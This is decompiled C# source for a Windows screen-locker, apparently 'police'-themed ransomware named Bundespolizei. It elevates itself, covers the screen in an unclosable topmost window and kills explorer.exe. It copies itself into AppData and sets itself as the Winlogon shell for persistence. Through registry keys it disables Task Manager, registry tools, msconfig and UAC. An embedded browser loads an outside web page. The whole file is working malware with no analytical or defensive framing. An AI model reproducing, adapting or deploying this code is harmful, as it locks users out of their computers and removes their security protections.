using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Bundespolizei;

public class Form1 : Form
{
	private const int SW_RESTORE = 9;

	private IContainer components = null;

	private Timer timer1;

	private WebBrowser webBrowser1;

	[DllImport("user32.dll")]
	private static extern bool SetForegroundWindow(IntPtr hWnd);

	[DllImport("user32.dll")]
	private static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);

	[DllImport("user32.dll")]
	private static extern bool IsIconic(IntPtr hWnd);

	public Form1()
	{
		InitializeComponent();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		SetForegroundWindow(((Control)this).get_Handle());
	}

	private void restart()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.UseShellExecute = true;
		processStartInfo.WorkingDirectory = Environment.CurrentDirectory;
		processStartInfo.FileName = Assembly.GetExecutingAssembly().Location;
		processStartInfo.Verb = "runas";
		try
		{
			Process.Start(processStartInfo);
			Application.Exit();
		}
		catch (Win32Exception)
		{
			rest();
		}
	}

	internal static bool IsElevated()
	{
		WindowsIdentity current = WindowsIdentity.GetCurrent();
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
		return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
	}

	private void rest()
	{
		try
		{
			timer1.Start();
			((Form)this).set_WindowState((FormWindowState)2);
			((Form)this).set_FormBorderStyle((FormBorderStyle)0);
			((Control)this).set_Bounds(Screen.get_PrimaryScreen().get_Bounds());
			((Form)this).set_TopMost(true);
		}
		catch
		{
		}
		try
		{
			try
			{
				Process.Start("taskkill.exe", " /f /im explorer.exe");
			}
			catch
			{
			}
			try
			{
				if (!Directory.Exists("C:\\Users\\" + Environment.UserName + "\\Appdata\\Roaming\\Microsoft\\kp\\"))
				{
					Directory.CreateDirectory("C:\\Users\\" + Environment.UserName + "\\Appdata\\Roaming\\Microsoft\\kp\\");
				}
				if (!File.Exists("C:\\Users\\" + Environment.UserName + "\\Appdata\\Roaming\\Microsoft\\kp\\kp.exe"))
				{
					File.Copy(Application.get_StartupPath() + "\\" + GetCurrentFileName(), "C:\\Users\\" + Environment.UserName + "\\Appdata\\Roaming\\Microsoft\\kp\\kp.exe", overwrite: true);
				}
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey.SetValue("DisableTaskMgr", 1);
				registryKey.SetValue("DisableRegistryTools", 1);
				registryKey.SetValue("DisableMsconfig", 1);
				registryKey.SetValue("EnableLUA", 0);
				registryKey.SetValue("ConsentPromptBehaviorAdmin", 0);
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
				registryKey2.SetValue("Shell", "C:\\Users\\" + Environment.UserName + "\\Appdata\\Roaming\\Microsoft\\kp\\kp.exe");
			}
			catch
			{
			}
		}
		catch
		{
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			if (!File.Exists("C:\\Users\\" + Environment.UserName + "\\Appdata\\Roaming\\Microsoft\\kp\\kp.exe") && !IsElevated())
			{
				restart();
			}
			rest();
		}
		catch
		{
		}
	}

	public static string GetCurrentFileName()
	{
		FileInfo fileInfo = new FileInfo(Assembly.GetExecutingAssembly().Location);
		return fileInfo.Name;
	}

	private void Form_Closing(object sender, CancelEventArgs e)
	{
		e.Cancel = true;
	}

	private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f0: Expected O, but got Unknown
		components = new Container();
		timer1 = new Timer(components);
		webBrowser1 = new WebBrowser();
		((Control)this).SuspendLayout();
		timer1.set_Interval(10);
		timer1.add_Tick((EventHandler)timer1_Tick);
		webBrowser1.set_AllowWebBrowserDrop(false);
		((Control)webBrowser1).set_Dock((DockStyle)5);
		webBrowser1.set_IsWebBrowserContextMenuEnabled(false);
		((Control)webBrowser1).set_Location(new Point(0, 0));
		((Control)webBrowser1).set_Name("webBrowser1");
		((Control)webBrowser1).set_Size(new Size(116, 22));
		((Control)webBrowser1).set_TabIndex(0);
		webBrowser1.set_Url(new Uri("http://404cracks.bplaced.net/Home.html", UriKind.Absolute));
		webBrowser1.set_WebBrowserShortcutsEnabled(false);
		webBrowser1.add_DocumentCompleted(new WebBrowserDocumentCompletedEventHandler(webBrowser1_DocumentCompleted));
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(116, 22));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)webBrowser1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
